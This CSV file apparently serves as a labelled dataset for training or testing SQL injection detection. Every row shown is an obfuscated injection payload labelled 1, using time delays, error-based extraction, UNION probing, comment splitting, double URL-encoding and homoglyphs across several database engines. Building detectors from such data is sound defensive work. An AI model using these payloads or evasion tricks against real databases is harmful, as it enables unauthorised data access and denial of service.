Query,Label
"SELECT * FRΟM (SELECT ’IF(1=1, SLEEP(5), 0)--select   (  cаse when   (  1093  =  7693  )   then 1093 else 1/  (  select 0  )   end  )  --’) AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--se/**/lect count  (  *  )   fr/**/om аll_users t1,аll_users t2,аll_users t3,аll_users t4,аll_users t5--",1
SELECT%2520%252A%2520FR%25CE%259FM%2520%2528SELECT%2520%25E2%2580%25991%2525%25E2%2580%2599%2520%25D0%25B0nd%2520%2520%2520%2528%2520%2520select%25202%252A%2520%2520%2528%2520%2520if%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520select%2520%252A%2520from%2520%2520%2520%2528%2520%2520select%2520conc%25D0%25B0t%2520%2520%2528%2520%25200x7171706%25D0%25B071%252C%2520%2520%2528%2520%2520select%2520%2520%2520%2528%2520%2520elt%2520%2520%2528%2520%25203484%2520%2520%253D%2520%25203484%252C1%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520%252C0x717%25D0%25B0767%25D0%25B071%252C0x78%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520s%2520%2520%2529%2520%2520%252C%25208446744073709551610%252C%25208446744073709551610%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520%2520%25D0%25B0nd%2520%25E2%2580%2599%2525%25E2%2580%2599%2520%2520%253D%2520%2520%25E2%2580%2599%25E2%2580%2599%2529%2520AS%2520benign_sub,1
"IF(1=1, SLEEP(5), 0)--SELECT * FROM (SELECT '1%2525%2522%2520%2520%2529%2520%2520%2520procedure%2520analyse%2520%2520%2528%2520%2520extractvalue%2520%2520%2528%2520%25209255%252Cconcat%2520%2520%2528%2520%25200x5c%252C%2520%2520%2528%2520%2520benchmark%2520%2520%2528%2520%25205000000%252Cmd5%2520%2520%2528%2520%25200x52515a50%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520%252C1%2520%2520%2529%2520%2520%2520and%2520%2520%2520%2528%2520%2520%2522%2525%2522%2520%2520%253D%2520%2520%2522') AS benign_sub",1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--1%2527%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520%2520or%2520%2520%2520%2528%2520%2520select%25209173%2520from%2520%2520%2528%2520%2520select%2520count%2520%2520%2528%2520%2520%252A%2520%2520%2529%2520%2520%252Cconcаt%2520%2520%2528%2520%25200x7171706а71%252C%2520%2520%2528%2520%2520select%2520%2520%2520%2528%2520%2520elt%2520%2520%2528%2520%25209173%2520%2520%253D%2520%25209173%252C1%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520%252C0x717а767а71%252Cfloor%2520%2520%2528%2520%2520rаnd%2520%2520%2528%2520%25200%2520%2520%2529%2520%2520%252A2%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520x%2520from%2520informаtion_schemа.chаrаcter_sets%2520group%2520by%2520x%2520%2520%2529%2520%2520а%2520%2520%2529%2520%2520%2520аnd%2520%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520%2520%2520%2528%2520%2520%2527ymаd%2527%2520like%2520%2527ymаd,1
"IF(1=1, SLEEP(5), 0)--SE/**/LECT * FR/**/OM (SE/**/LECT '1' w/**/here 2202  =  2202 a/**/nd 2716  =    (  se/**/lect count  (  *  )   fr/**/om sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --') AS benign_sub",1
1%2520%2520%2529%2520%2520%2520w/**/here%25203915%2520%2520%253D%2520%25203915%2520un/**/ion%2520аll%2520se/**/lect%2520null%252Cnull%252Cnull%252Cnull%2523,1
SE/%252A%252A/LECT%2520%252A%2520FR/%252A%252A/OM%2520%2528SE/%252A%252A/LECT%2520%2527-7808%2522%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520as%2520jgkk%2520w/%252A%252A/here%25209230%2520%2520%253D%2520%25209230%2520o/%252A%252A/r%2520elt%2520%2520%2528%2520%25201032%2520%2520%253D%2520%25201032%252C3623%2520%2520%2529%2520%2520--%2527%2529%2520AS%2520benign_sub,1
"SE/**/LECT * FR/**/OM (SE/**/LECT '-7514%""   )    )     )   o/**/r 2448  =  8797#') AS benign_sub",1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529---8758%2527%2520un/%252A%252A/ion%2520all%2520se/%252A%252A/lect%25206885%252C6885%252C6885%252C6885%252C6885%252C6885%252C6885%252C6885--,1
"IF(1=1, SLEEP(5), 0)--select%2520like%2520%2520%2528%2520%2520%25E2%2580%2599%25D0%25B0bcdefg%25E2%2580%2599%252Cupper%2520%2520%2528%2520%2520hex%2520%2520%2528%2520%2520r%25D0%25B0ndomblob%2520%2520%2528%2520%2520500000000/2%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2523",1
"IF(1=1, SLEEP(5), 0)--1’   )    )    аs bswc w/**/here 1635  =  1635 аnd 7756  =  dbms_utility.sqlid_to_sqlhаsh   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  se/**/lect   (  cаse when   (  7756  =  7756  )   then 1 else 0 end  )   fr/**/om duаl  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)--1"" w/**/here 8387  =  8387') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--SELECT * FROM (SELECT '1'||  (  se/**/lect 'jzwq' w/**/here 3289  =  3289 un/**/ion all se/**/lect null,null,null,null,null,null,null#') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--1%252C%2520%2520%2528%2520%2520se/**/lect%2520%2520%2520%2528%2520%2520case%2520when%2520%2520%2520%2528%2520%25207711%2520%2520%253D%2520%25207711%2520%2520%2529%2520%2520%2520then%25201%2520else%25207711%252A%2520%2520%2528%2520%2520se/**/lect%25207711%2520fr/**/om%2520info/**/rmation_schema.character_sets%2520%2520%2529%2520%2520%2520end%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520",1
"IF(1=1, SLEEP(5), 0)--1%’   )    )     )   аnd 6537  =  dbms_pipe.receive_messаge  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   аnd    (    (     (  ’%’  =  ’",1
"IF(1=1, SLEEP(5), 0)--1’  )   аs zmvn w/**/here 2887  =  2887 un/**/ion аll se/**/lect null--",1
"SE/**/LECT * FR/**/ΟM (SE/**/LECT ’1’  )   а/**/nd elt  (  1210  =  1210,sleep  (  5   )    )    а/**/nd   (  ’medg’  =  ’medg’) AS benign_sub",1
"SE/**/LECT * FRΟM (SE/**/LECT ’1’  )   w/**/here 4092  =  4092 o/**/r chаr  (  75  )  ||chаr  (  70  )  ||chаr  (  99  )  ||chаr  (  83  )    =  regexp_substring  (  repeаt  (  left  (  crypt_key  (  chаr  (  65  )  ||chаr  (  69  )  ||chаr  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --’) AS benign_sub",1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)--1’   )    )     )   union аll select null,null,null,null#') AS benign_sub",1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)--1'   )    )    a/**/nd 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  se/**/lect   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   a/**/nd    (    (   'cuav'  =  'cuav') AS benign_sub",1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)--1%’  )   аnd 8148  =  like  (  ’аbcdefg’,upper  (  hex  (  rаndomblob  (  500000000/2   )    )      )    )   --') AS benign_sub",1
SE/**/LECT%2520%252A%2520FR/**/OM%2520%2528SE/**/LECT%2520%25271%2527%252Ciif%2520%2520%2528%2520%25207475%2520%2520%253D%2520%25207475%252C1%252C1/0%2520%2520%2529%2520%2520%2527%2529%2520AS%2520benign_sub,1
"SELECT * FRΟM (SELECT ’IF(1=1, SLEEP(5), 0)--1’   )    )     )   union аll select null,null--’) AS benign_sub",1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529---2316%2525%2527%2520un/**/ion%2520all%2520se/**/lect%25208636%252C8636%252C8636%252C8636%252C8636%252C8636%252C8636--,1
"IF(1=1, SLEEP(5), 0)--SELECT%2520%252A%2520FROM%2520%2528SELECT%2520%2527-5617%2520%2520%2529%2520%2520%2520where%25202132%2520%2520%253D%2520%25202132%2520union%2520all%2520select%25202132%252C2132%252C2132%252C2132%2523%2527%2529%2520AS%2520benign_sub",1
"IF(1=1, SLEEP(5), 0)--1%2527%2520%2520%2529%2520%2520%2520аnd%2520sleep%2520%2520%2528%2520%25205%2520%2520%2529%2520",1
"IF(1=1, SLEEP(5), 0)--SE/**/LECT * FR/**/OM (SE/**/LECT 'se/**/lect count  (  *  )   fr/**/om all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 a/**/nd ""vcup""  =  ""vcup') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--1%2522%2520%2520%2529%2520%2520%2520аs%2520yzzk%2520where%25201813%2520%2520%253D%2520%25201813%2520аnd%2520%2520%2520%2528%2520%25203020%2520%2520%253D%2520%25203020%2520%2520%2529%2520%2520%252A6703--",1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--1%25E2%2580%2599%252B%2520%2520%2528%2520%2520select%2520mkbv%2520where%25201648%2520%2520%253D%2520%25201648%2520%25D0%25B0nd%25209254%2520%2520%253D%2520%2520%2520%2520%2528%2520%2520select%2520count%2520%2520%2528%2520%2520%252A%2520%2520%2529%2520%2520%2520from%2520rdb%2524fields%2520%25D0%25B0s%2520t1%252Crdb%2524types%2520%25D0%25B0s%2520t2%252Crdb%2524coll%25D0%25B0tions%2520%25D0%25B0s%2520t3%252Crdb%2524functions%2520%25D0%25B0s%2520t4%2520%2520%2529%2520%2520--,1
"IF(1=1, SLEEP(5), 0)---7600’ o/**/r 7684  =  3181#",1
SELECT%2520%252A%2520FROM%2520%2528SELECT%2520%25271%2522%2520%2520%2529%2520%2520%2520waitfo/%252A%252A/r%2520delay%2520%25270%253A0%253A5%2527%2520a/%252A%252A/nd%2520%2520%2520%2528%2520%2520%2522vjpg%2522%2520%2520%253D%2520%2520%2522vjpg%2527%2529%2520AS%2520benign_sub,1
SELECT * FROM (SELECT '-1769%2520union%2520%25D0%25B0ll%2520select%25206054--') AS benign_sub,1
1%2525%2522%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520rlike%2520%2520%2520%2528%2520%2520se/**/lect%2520%2520%2520%2528%2520%2520c%25D0%25B0se%2520when%2520%2520%2520%2528%2520%25204207%2520%2520%253D%2520%25201757%2520%2520%2529%2520%2520%2520then%25201%2520else%25200x28%2520end%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%25D0%25B0nd%2520%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520%2522%2525%2522%2520%2520%253D%2520%2520%2522,1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--1%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%25D0%25B0s%2520bsvo%2520where%25203605%2520%2520%253D%2520%25203605,1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--1%2520%2520%2529%2520%2520%2520procedure%2520analyse%2520%2520%2528%2520%2520extractvalue%2520%2520%2528%2520%25205840%252Cconcat%2520%2520%2528%2520%25200x5c%252C0x7171706a71%252C%2520%2520%2528%2520%2520se/**/lect%2520%2520%2520%2528%2520%2520case%2520when%2520%2520%2520%2528%2520%25205840%2520%2520%253D%2520%25205840%2520%2520%2529%2520%2520%2520then%25201%2520else%25200%2520end%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%252C0x717a767a71%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%252C1%2520%2520%2529%2520%2520%2520a/**/nd%2520%2520%2520%2528%2520%25206986%2520%2520%253D%2520%25206986,1
"SELECT * FRΟM (SELECT ’IF(1=1, SLEEP(5), 0)--1%""  )   or sleep  (  5  )   аnd   (  ""%""  =  ""’) AS benign_sub",1
SE/%252A%252A/LECT%2520%252A%2520FR/%252A%252A/OM%2520%2528SE/%252A%252A/LECT%2520%2527-6815%2520%2520%2529%2520%2520%2520w/%252A%252A/here%25202498%2520%2520%253D%2520%25202498%2520un/%252A%252A/ion%2520all%2520se/%252A%252A/lect%25202498%252C2498%252C2498%252C2498%252C2498--%2527%2529%2520AS%2520benign_sub,1
SE/**/LECT * FR/**/OM (SE/**/LECT '1%2527%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520as%2520anaq%2520w/**/here%25209605%2520%2520%253D%2520%25209605%2520a/**/nd%2520elt%2520%2520%2528%2520%25204249%2520%2520%253D%2520%25204249%252C7259%2520%2520%2529%2520%2520--') AS benign_sub,1
SELECT * FROM (SELECT '1’+  (  se/**/lect smze w/**/here 5616  =  5616') AS benign_sub,1
"SE/**/LECT * FR/**/OM (SE/**/LECT '1%""   )    )    o/**/r 6979  =  like  (  ’аbcdefg’,upper  (  hex  (  rаndomblob  (  500000000/2   )    )      )    )   --') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--1’ w/**/here 2373  =  2373 un/**/ion аll se/**/lect null,null#",1
SELECT%2520%252A%2520FROM%2520%2528SELECT%2520%2527IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--1%2527%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520%2520and%25208312%2520%2520%253D%2520%2520dbms_pipe.receive_message%2520%2520%2528%2520%2520chr%2520%2520%2528%2520%252069%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%252079%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520101%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%252068%2520%2520%2529%2520%2520%252C5%2520%2520%2529%2520%2520--%2527%2529%2520AS%2520benign_sub,1
"IF(1=1, SLEEP(5), 0)--1’  )   аnd 2853  =  cаst   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  se/**/lect   (  cаse when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    аs numeric  )   аnd   (  ’xаzf’  =  ’xаzf",1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529---7126%25E2%2580%2599%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%25D0%25B0s%2520fzpp%2520where%25208078%2520%2520%253D%2520%25208078%2520union%2520%25D0%25B0ll%2520select%25208078%252C8078%252C8078%252C8078%252C8078%252C8078%252C8078%2523,1
"IF(1=1, SLEEP(5), 0)--1%2527%2520rlike%2520sleep%2520%2520%2528%2520%25205%2520%2520%2529%2520",1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)---8448%"" or 4747  =  dbms_utility.sqlid_to_sqlhаsh   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  cаse when   (  4747  =  4747  )   then 1 else 0 end  )   from duаl  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   аnd ""%""  =  ""') AS benign_sub",1
SELECT%2520%252A%2520FROM%2520%2528SELECT%2520%2527IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--1%2522%2520%2520%2529%2520%2520%2520where%25208571%2520%2520%253D%2520%25208571%2520and%2520elt%2520%2520%2528%2520%25204249%2520%2520%253D%2520%25204249%252C7259%2520%2520%2529%2520%2520--%2527%2529%2520AS%2520benign_sub,1
"IF(1=1, SLEEP(5), 0)--se/**/lect   (  cаse when   (  4059  =  7807  )   then 4059 else 1/  (  se/**/lect 0  )   end  )  --",1
SE/**/LECT * FRΟM (SE/**/LECT ’-9809’ o/**/rder by 1--’) AS benign_sub,1
"IF(1=1, SLEEP(5), 0)--SELECT * FRΟM (SELECT ’-9008’  )   union аll select 4976,4976,4976,4976#’) AS benign_sub",1
SELECT%2520%252A%2520FROM%2520%2528SELECT%2520%2527%2520%2520%2528%2520%2520upd%25D0%25B0texml%2520%2520%2528%2520%25208862%252Cconc%25D0%25B0t%2520%2520%2528%2520%25200x2e%252C0x7171706%25D0%25B071%252C%2520%2520%2528%2520%2520select%2520%2520%2520%2528%2520%2520elt%2520%2520%2528%2520%25208862%2520%2520%253D%2520%25208862%252C1%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520%252C0x717%25D0%25B0767%25D0%25B071%2520%2520%2529%2520%2520%252C8981%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2527%2529%2520AS%2520benign_sub,1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)---4745"" o/**/r 5903  =    (  'qqpjq'||  (  se/**/lect case 5903 when 5903 then 1 else 0 end fr/**/om rdb$database  )  ||'qzvzq'  )   a/**/nd ""nifq"" like ""nifq') AS benign_sub",1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)--1""  )   as hymr w/**/here 5497  =  5497 un/**/ion all se/**/lect null,null,null,null--') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--1’,  (  se/**/lect   (  cаse when   (  5217  =  5217  )   then 1 else 5217*  (  se/**/lect 5217 fr/**/om mysql.db  )   end   )    )   ",1
"IF(1=1, SLEEP(5), 0)--SELECT * FROM (SELECT '1%2520and%2520elt%2520%2520%2528%2520%25201210%2520%2520%253D%2520%25201210%252Csleep%2520%2520%2528%2520%25205%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2523%2520macc') AS benign_sub",1
SELECT * FRΟM (SELECT ’1%2520аnd%25209660%2520%2520%253D%2520%2520%2520%2520%2528%2520%2520select%2520count%2520%2520%2528%2520%2520%252A%2520%2520%2529%2520%2520%2520from%2520аll_users%2520t1%252Cаll_users%2520t2%252Cаll_users%2520t3%252Cаll_users%2520t4%252Cаll_users%2520t5%2520%2520%2529%2520%2520--’) AS benign_sub,1
1%2522%2520%2520%2529%2520%2520%2520w/%252A%252A/here%25206128%2520%2520%253D%2520%25206128%2520а/%252A%252A/nd%2520chаr%2520%2520%2528%2520%2520120%2520%2520%2529%2520%2520%257C%257Cchаr%2520%2520%2528%2520%2520106%2520%2520%2529%2520%2520%257C%257Cchаr%2520%2520%2528%2520%2520117%2520%2520%2529%2520%2520%257C%257Cchаr%2520%2520%2528%2520%252085%2520%2520%2529%2520%2520%2520%2520%253D%2520%2520regexp_substring%2520%2520%2528%2520%2520repeаt%2520%2520%2528%2520%2520right%2520%2520%2528%2520%2520chаr%2520%2520%2528%2520%25209981%2520%2520%2529%2520%2520%252C0%2520%2520%2529%2520%2520%252C5000000000%2520%2520%2529%2520%2520%252Cnull%2520%2520%2529%2520%2520--,1
"IF(1=1, SLEEP(5), 0)--SE/**/LECT * FR/**/OM (SE/**/LECT 'iif  (  9342  =  6508,1,1/0  )  ') AS benign_sub",1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--SELECT%2520%252A%2520FROM%2520%2528SELECT%2520%2527-5779%2520%2520%2529%2520%2520%2520union%2520all%2520select%25206089%252C6089--%2527%2529%2520AS%2520benign_sub,1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)---9721'  )   o/**/r 9287  =  4362#') AS benign_sub",1
SELECT * FRΟM (SELECT ’1%2527%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520%2520аnd%25205934%2520%2520%253D%2520%25202309’) AS benign_sub,1
"IF(1=1, SLEEP(5), 0)--SELECT * FRΟM (SELECT ’1’  )   union аll select null,null,null#’) AS benign_sub",1
1%25E2%2580%2599%2520w/%252A%252A/here%25208437%2520%2520%253D%2520%25208437%2520%25D0%25B0nd%2520m%25D0%25B0ke_set%2520%2520%2528%2520%25208403%2520%2520%253D%2520%25208403%252C8899%2520%2520%2529%2520%2520--,1
"IF(1=1, SLEEP(5), 0)--1   )    )     )   o/**/r 4915  =    (  se/**/lect count  (  *  )   fr/**/om domаin.domаins аs t1,domаin.columns аs t2,domаin.tаbles аs t3  )  --",1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)--1%2520%2520%2529%2520%2520%2520or%25204240%2520%2520%253D%2520%2520%2520%2520%2528%2520%2520select%25204240%2520from%2520pg_sleep%2520%2520%2528%2520%25205%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520--') AS benign_sub",1
-9178%2520w/**/here%25202253%2520%2520%253D%2520%25202253%2520un/**/ion%2520%25D0%25B0ll%2520se/**/lect%25202253%252C2253%252C2253%252C2253%252C2253%252C2253%252C2253%252C2253%2523,1
"IF(1=1, SLEEP(5), 0)--1%25E2%2580%2599%2520%2520%2529%2520%2520%2520%25D0%25B0nd%2520ch%25D0%25B0r%2520%2520%2528%2520%2520111%2520%2520%2529%2520%2520%257C%257Cch%25D0%25B0r%2520%2520%2528%2520%252077%2520%2520%2529%2520%2520%257C%257Cch%25D0%25B0r%2520%2520%2528%2520%2520121%2520%2520%2529%2520%2520%257C%257Cch%25D0%25B0r%2520%2520%2528%2520%252088%2520%2520%2529%2520%2520%2520%2520%253D%2520%2520regexp_substring%2520%2520%2528%2520%2520repe%25D0%25B0t%2520%2520%2528%2520%2520left%2520%2520%2528%2520%2520crypt_key%2520%2520%2528%2520%2520ch%25D0%25B0r%2520%2520%2528%2520%252065%2520%2520%2529%2520%2520%257C%257Cch%25D0%25B0r%2520%2520%2528%2520%252069%2520%2520%2529%2520%2520%257C%257Cch%25D0%25B0r%2520%2520%2528%2520%252083%2520%2520%2529%2520%2520%252Cnull%2520%2520%2529%2520%2520%252C0%2520%2520%2529%2520%2520%252C500000000%2520%2520%2529%2520%2520%252Cnull%2520%2520%2529%2520%2520%2520%25D0%25B0nd%2520%2520%2520%2528%2520%2520%25E2%2580%2599%25D0%25B0djc%25E2%2580%2599%2520%2520%253D%2520%2520%25E2%2580%2599%25D0%25B0djc",1
SELECT%2520%252A%2520FROM%2520%2528SELECT%2520%2527select%2520%252A%2520from%2520gener%25D0%25B0te_series%2520%2520%2528%2520%25207754%252C7754%252Cc%25D0%25B0se%2520when%2520%2520%2520%2528%2520%25207754%2520%2520%253D%2520%25201252%2520%2520%2529%2520%2520%2520then%25201%2520else%25200%2520end%2520%2520%2529%2520%2520%2520limit%25201--%2527%2529%2520AS%2520benign_sub,1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--1%2520a/%252A%252A/nd%25202853%2520%2520%253D%2520%2520cast%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520chr%2520%2520%2528%2520%2520113%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520113%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520112%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520106%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520113%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%257C%257C%2520%2520%2528%2520%2520se/%252A%252A/lect%2520%2520%2520%2528%2520%2520case%2520when%2520%2520%2520%2528%2520%25202853%2520%2520%253D%2520%25202853%2520%2520%2529%2520%2520%2520then%25201%2520else%25200%2520end%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%253A%253Atext%257C%257C%2520%2520%2528%2520%2520chr%2520%2520%2528%2520%2520113%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520122%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520118%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520122%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520113%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520as%2520numeric%2520%2520%2529%2520,1
"IF(1=1, SLEEP(5), 0)--se/**/lect%2520count%2520%2520%2528%2520%2520%252A%2520%2520%2529%2520%2520%2520fr/**/om%2520sysibm.systables%2520as%2520t1%252Csysibm.systables%2520as%2520t2%252Csysibm.systables%2520as%2520t3%2520a/**/nd%2520%2527osqf%2527%2520%2520%253D%2520%2520%2527osqf",1
1%25E2%2580%2599%2520%2520%2529%2520%2520%2520o/**/r%2520upd%25D0%25B0texml%2520%2520%2528%2520%25201808%252Cconc%25D0%25B0t%2520%2520%2528%2520%25200x2e%252C0x7171706%25D0%25B071%252C%2520%2520%2528%2520%2520se/**/lect%2520%2520%2520%2528%2520%2520elt%2520%2520%2528%2520%25201808%2520%2520%253D%2520%25201808%252C1%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520%252C0x717%25D0%25B0767%25D0%25B071%2520%2520%2529%2520%2520%252C8666%2520%2520%2529%2520%2520%2520%25D0%25B0nd%2520%2520%2520%2528%2520%2520%25E2%2580%2599iifh%25E2%2580%2599%2520%2520%253D%2520%2520%25E2%2580%2599iifh,1
"IF(1=1, SLEEP(5), 0)--se/**/lect count  (  *  )   fr/**/om domаin.domаins аs t1,domаin.columns аs t2,domаin.tаbles аs t3 а/**/nd    (    (     (  5324  =  5324",1
"IF(1=1, SLEEP(5), 0)--1%2522%2520%2520%2529%2520%2520%2520where%25207753%2520%2520%253D%2520%25207753",1
SELECT * FRΟM (SELECT ’1%2520%2520%2529%2520%2520%2520аnd%25206510%2520%2520%253D%2520%2520%2520%2520%2528%2520%2520select%2520count%2520%2520%2528%2520%2520%252A%2520%2520%2529%2520%2520%2520from%2520sysusers%2520аs%2520sys1%252Csysusers%2520аs%2520sys2%252Csysusers%2520аs%2520sys3%252Csysusers%2520аs%2520sys4%252Csysusers%2520аs%2520sys5%252Csysusers%2520аs%2520sys6%252Csysusers%2520аs%2520sys7%2520%2520%2529%2520%2520%2520аnd%2520%2520%2520%2528%2520%25209841%2520%2520%253D%2520%25209841’) AS benign_sub,1
"IF(1=1, SLEEP(5), 0)--  (  cаst   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  se/**/lect 1 fr/**/om generаte_series  (  9815,9815,cаse when   (  9815  =  9815  )   then 1 else 0 end  )   limit 1  )  ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    аs numeric   )    )   ",1
SELECT * FROM (SELECT '1%2527%2520%2520%2529%2520%2520%2520аs%2520wtfo%2520where%25205666%2520%2520%253D%2520%25205666%2520union%2520аll%2520select%2520null%252Cnull%252Cnull%252Cnull--') AS benign_sub,1
